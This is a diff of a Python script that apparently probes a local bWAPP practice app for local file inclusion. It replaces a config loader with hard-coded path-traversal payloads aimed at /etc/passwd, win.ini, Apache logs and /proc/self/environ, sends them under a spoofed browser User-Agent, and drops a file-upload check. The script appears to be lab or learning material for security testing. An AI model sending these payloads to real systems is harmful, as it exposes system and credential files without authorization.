@@ -1,5 +1,3 @@
-from bs4 import BeautifulSoup
-import json
 import requests
 import re
 from requests.adapters import HTTPAdapter
@@ -13,11 +11,6 @@ def create_session():
     session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
     return session
 
-# Function to load JSON configuration
-def load_config(file_path):
-    with open(file_path, 'r') as json_file:
-        return json.load(json_file)
-
 # Function to send HTTP request
 def send_request(session, url, payload):
     try:
@@ -28,36 +21,30 @@ def send_request(session, url, payload):
         print(f"Request failed: {e}")
         return ""
 
-# Advanced LFI detection
+# Advanced LFI detection with hardcoded payloads
 def advanced_lfi_detection(url):
     session = create_session()
-    config = load_config('configs/lfi_config.json')
+    payloads = [
+        {"name": "etc/passwd", "payload": "file=../../../../etc/passwd", "response": "root:x:0:0:"},
+        {"name": "windows/win.ini", "payload": "file=../../../../windows/win.ini", "response": "[fonts]"},
+        {"name": "apache/logs", "payload": "file=../../../../var/log/apache2/access.log", "response": "GET /"},
+        {"name": "proc/self/environ", "payload": "file=../../../../proc/self/environ", "response": "USER="}
+    ]
 
-    for item in config:
+    for item in payloads:
         name = item.get('name')
         payload = item.get('payload')
         response_pattern = item.get('response')
 
         response = send_request(session, url, payload)
         if re.search(response_pattern, response):
-            print(f"Parameter might be vulnerable to {name}")
-            print(f"Payload: {payload}")
-            break
-
-def file_upload_vulnerability(url):
-    try:
-        page = requests.get(url)
-        soup = BeautifulSoup(page.content, 'html.parser')
-        inputs = soup.find_all('input', {'type': 'file'})
-        
-        if inputs:
-            print("[+] File Upload Function available")
-        else:
-            print("[-] File Upload Function not found")
-    except requests.RequestException as e:
-        print(f"Error accessing {url}: {e}")
+            print(f"URL is vulnerable to {name} attack")
+            print(f"Used payload: {payload}")
+            return True
+    return False
 
 # Example usage
-url = "http://localhost/bWAPP/rlfi.php"
-advanced_lfi_detection(url)
-#file_upload_vulnerability(url)
+url_lfi = "http://localhost/bWAPP/rlfi.php"
+
+if advanced_lfi_detection(url_lfi):
+    print(f"{url_lfi} is vulnerable to LFI")
